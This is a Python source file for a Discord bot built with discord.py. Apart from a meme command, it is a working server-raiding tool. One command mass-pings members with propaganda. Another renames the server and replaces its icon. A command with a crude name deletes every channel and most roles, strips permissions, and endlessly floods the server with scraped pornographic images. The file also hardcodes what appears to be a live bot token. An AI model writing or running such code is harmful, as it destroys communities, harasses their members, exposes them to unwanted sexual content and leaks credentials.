#       ===beenz-bot v1.0===
# ===Copyright 2020 Joshua Britain===

print("Loading beenzbot...")

import discord
import random
import os
import imagesearch
import io
import aiohttp

# ---Setup connection to bot---
TOKEN = 'NjgyMzI5OTA1ODk5NjM0NzMz.XlbbfQ.b5nto8lGAwhXeNxWjLCxoxcgiaM'
client = discord.Client()


# ---Main command setup---
@client.event

async def on_message(message):
     if message.author == client.user: #prevent bot replying to itself
          return

     #--Fake meme feature--
     if message.content.lower() == "$meme":
          memes = imagesearch.getImages("https://reddit.com/r/dankmemes") #load dankmemes hot page
          meme = random.choice(memes) #select random image from page
          while not meme.startswith("https://i.redd.it/"): #check it is an uploaded file and not an asset
               meme = random.choice(memes)
          
          async with aiohttp.ClientSession() as session: #http stuff I don't understand
                         async with session.get(meme) as resp:
                            if resp.status != 200:
                                return await channel.send('`error loading image`')
                            data = io.BytesIO(await resp.read())
                            await message.channel.send(file=discord.File(data, os.path.basename(meme))) #send the meme

     # --Spam server with propaganda--
     if message.content.lower() == "$propaganda":
          for i in range(15):
               await message.channel.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
               await message.channel.send(file=discord.File('assets/flag.png'))
               await message.channel.send("Join us: https://discord.gg/arvVft4")

     # --Claim the server as a colony of Heinz--
     if message.content.lower() == "$colony":
          await message.guild.edit(name="Colony of Heinz") #change server name

          with open(os.path.join(os.path.dirname(__file__), "assets/flag.png"), 'rb') as f:
               await message.guild.edit(icon=f.read()) #change server icon

     # --Destroy the server--
     if message.content.lower() == "$rape":

          #-delete all channels-
          channels = []
          for channel in message.guild.channels: #get all channels
                    channels.append(channel)

          for channel in channels:
               await channel.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")

          #-make new channel-
          channel = await message.guild.create_text_channel('HEINZ')
          heinz = client.get_channel(message.guild.channels[0].id)
          await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")

          #-delete all roles-
          roles = []
          try:
               for role in message.guild.roles: #get all roles
                    roles.append(role)
                    
               for role in roles[2:]:
                    await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
          except Exception:
               await heinz.send("`error editing roles`")

          #-remove all perms-

          perms = discord.Permissions() #create new empty permissions object
          perms.update(read_messages = True) #make it so user can see messages
               
          for role in roles:
               if role.name == "@everyone": #get only @everyone role
                    await role.edit(permissions=perms) #apply new permissions

          #-spam images-
          

          hentai = imagesearch.getImages("https://hentaihaven.xxx") #load hentai from hentaihaven (kill me now)
          try:
               while True: #repeat 1000
                    y = random.choice(hentai) #get random bit of hentai
                    async with aiohttp.ClientSession() as session: #http stuff I don't understand
                         async with session.get(y) as resp:
                              if resp.status != 200:
                                   return await channel.send('`error loading image`')
                              data = io.BytesIO(await resp.read())
                              await channel.send(file=discord.File(data, os.path.basename(y))) #send hentai
          except Exception:
               print("Kicked from server")
         
     
@client.event
async def on_ready():
     print('------')
     print('Logged in as')
     print(client.user.name)
     print(client.user.id)
     print('------')


client.run(TOKEN)

